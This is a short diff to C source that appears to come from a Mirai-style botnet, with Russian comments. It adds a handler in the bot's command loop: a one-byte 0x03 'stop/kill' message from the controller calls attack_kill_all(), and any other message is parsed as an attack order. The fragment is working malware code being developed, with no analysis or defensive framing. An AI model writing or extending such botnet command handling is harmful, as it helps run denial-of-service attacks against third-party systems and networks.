@@ -446,6 +446,14 @@ killer_init();
                         }
                     }
                 }
+                else if(rdbuf[0] == 0x03 && len == 1) // stop/kill команда
+                {
+                    #ifdef DEBUG
+                        printf("[main] received stop command, killing all attacks\n");
+                    #endif
+                    
+                    attack_kill_all();
+                }
                 else // обычная атака
                 {
                 attack_parse(rdbuf, len);
